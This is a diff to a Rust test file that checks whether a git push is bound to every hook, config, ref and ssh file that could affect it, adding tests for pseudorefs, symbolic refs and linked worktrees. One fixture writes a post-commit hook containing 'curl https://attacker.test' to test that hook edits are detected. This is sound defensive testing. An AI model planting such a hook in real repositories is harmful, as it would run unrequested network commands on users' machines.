@@ -161,7 +161,7 @@ fn https_remotes_with_a_builtin_credential_helper_are_bound() {
 
 #[test]
 fn every_file_git_or_ssh_would_run_or_read_is_in_the_binding() {
-    let edits: [(&str, &str); 8] = [
+    let edits: [(&str, &str); 9] = [
         (
             "work/.git/hooks/post-commit",
             "curl https://attacker.test\n",
@@ -171,6 +171,7 @@ fn every_file_git_or_ssh_would_run_or_read_is_in_the_binding() {
         ("home/.gitconfig", "[user]\n\tname = someone\n"),
         ("work/.git/refs/heads/dev", "b\n"),
         ("work/.git/packed-refs", "# pack-refs\n"),
+        ("work/.git/dev", "c\n"),
         ("home/.ssh/config", "Host example.test\n    Port 30009\n"),
         (
             "etc/ssh/ssh_config.d/50-local.conf",
@@ -477,4 +478,91 @@ fn the_daemon_review_binding_query_binds_a_push_only_with_its_launch_context() {
     assert_eq!(binding_query(&repo, true).as_deref(), Some(bound.as_str()));
     repo.append("work/.git/config", "[push]\n\tdefault = current\n");
     assert_ne!(binding_query(&repo, true).as_deref(), Some(bound.as_str()));
+}
+
+#[test]
+fn a_pseudoref_or_symbolic_source_leaves_the_push_unbound() {
+    let repo = Repo::new();
+    for source in ["ORIG_HEAD", "FETCH_HEAD", "MERGE_HEAD", "AUTO_MERGE"] {
+        repo.write(
+            &format!("work/.git/{source}"),
+            &format!("{}\n", "d".repeat(40)),
+        );
+        let command = format!("git push origin {source}:dev");
+        assert_eq!(repo.state(&command), Err(MUTABLE_LAUNCHER), "{command}");
+    }
+    repo.write("work/.git/refs/heads/alias", "ref: refs/heads/dev\n");
+    assert_eq!(
+        repo.state("git push origin alias:dev"),
+        Err(UNPROVEN_LAUNCH)
+    );
+    assert!(repo.state("git push origin release-2026:dev").is_ok());
+}
+
+#[test]
+fn a_linked_worktree_pins_its_own_refs() {
+    let repo = Repo::new();
+    let common = repo.path("work/.git");
+    repo.write(
+        "linked/.git",
+        &format!("gitdir: {}\n", str_path(&common.join("worktrees/linked"))),
+    );
+    repo.write("work/.git/worktrees/linked/commondir", "../..\n");
+    repo.write(
+        "work/.git/worktrees/linked/HEAD",
+        "ref: refs/heads/feature\n",
+    );
+    repo.write(
+        "work/.git/refs/heads/feature",
+        &format!("{}\n", "e".repeat(40)),
+    );
+    repo.write(
+        "work/.git/worktrees/linked/refs/worktree/wip",
+        &format!("{}\n", "f".repeat(40)),
+    );
+    let state = |command: &str| {
+        let engines = Fake {
+            root: repo.root.to_string_lossy().into_owned(),
+            unreusable: None,
+        };
+        let env = BTreeMap::new();
+        let home = repo.path("home").to_string_lossy().into_owned();
+        let ctx = Ctx {
+            home: Some(&home),
+            env: &env,
+            deadline: Instant::now() + Duration::from_secs(10),
+            engines: &engines,
+        };
+        push_state(command, &str_path(&repo.path("linked")), &ctx)
+    };
+    for (command, edited) in [
+        (
+            "git push origin HEAD:feature",
+            "work/.git/worktrees/linked/HEAD",
+        ),
+        (
+            "git push origin HEAD:feature",
+            "work/.git/refs/heads/feature",
+        ),
+        (
+            "git push origin refs/worktree/wip:refs/heads/wip",
+            "work/.git/worktrees/linked/refs/worktree/wip",
+        ),
+    ] {
+        let before = state(command).unwrap();
+        let original = fs::read_to_string(repo.path(edited)).unwrap();
+        repo.write(
+            edited,
+            &original
+                .replace('e', "1")
+                .replace('f', "2")
+                .replace("feature", "other"),
+        );
+        assert_ne!(
+            state(command).unwrap_or_default(),
+            before,
+            "{command} after editing {edited}"
+        );
+        repo.write(edited, &original);
+    }
 }
